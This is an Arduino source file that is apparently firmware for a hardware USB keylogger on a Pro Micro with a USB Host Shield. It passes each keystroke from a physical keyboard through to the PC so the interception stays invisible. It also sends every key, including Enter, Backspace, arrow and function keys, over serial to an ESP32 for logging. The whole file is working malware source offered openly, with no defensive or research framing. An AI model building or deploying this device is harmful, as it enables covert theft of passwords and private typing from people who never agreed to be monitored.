// ================================================================
// USB HID Keylogger - Pro Micro (ATmega32U4)
// Board:   SparkFun Pro Micro 5V 16MHz
// Library: USB Host Shield Library 2.0
// ================================================================

#include <hidboot.h>
#include <usbhub.h>
#include <SoftwareSerial.h>

// Serial to ESP32: Pro Micro Pin 8 (RX), Pin 9 (TX)
SoftwareSerial espSerial(8, 9);

USB     Usb;
HIDBoot<USB_HID_PROTOCOL_KEYBOARD> HidKeyboard(&Usb);

// ── Keyboard Parser ───────────────────────────────────────────
class KbdRptParser : public KeyboardReportParser {
protected:
  void OnKeyDown(uint8_t mod, uint8_t key);
  void OnKeyUp  (uint8_t mod, uint8_t key);
};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) {
  uint8_t c = OemToAscii(mod, key);

  // Forward to PC as HID keyboard
  if (c) {
    Keyboard.press(c);
    delay(5);
    Keyboard.release(c);
  }

  // Send to ESP32 for logging
  if (c >= 32 && c < 127) {
    espSerial.print((char)c);
  } else if (c == 13)  { espSerial.print("[ENTER]\n"); }
  else if (c == 8)     { espSerial.print("[BKSP]");   }
  else if (c == 9)     { espSerial.print("[TAB]");    }
  else if (c == 27)    { espSerial.print("[ESC]");    }
  else if (key == 0x4F){ espSerial.print("[RIGHT]");  }
  else if (key == 0x50){ espSerial.print("[LEFT]");   }
  else if (key == 0x51){ espSerial.print("[DOWN]");   }
  else if (key == 0x52){ espSerial.print("[UP]");     }
  else if (key >= 0x3A && key <= 0x45) {
    espSerial.print("[F");
    espSerial.print(key - 0x39);
    espSerial.print("]");
  }
}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
  // Nothing needed on key up
}

KbdRptParser Prs;

// ── Setup ─────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  espSerial.begin(9600);
  Keyboard.begin();

  if (Usb.Init() == -1) {
    Serial.println(F("USB Host Shield init failed!"));
    while (1) {
      digitalWrite(LED_BUILTIN, HIGH); delay(200);
      digitalWrite(LED_BUILTIN, LOW);  delay(200);
    }
  }

  HidKeyboard.SetReportParser(0, &Prs);
  Serial.println(F("Keylogger Ready"));
}

// ── Loop ──────────────────────────────────────────────────────
void loop() {
  Usb.Task();
}
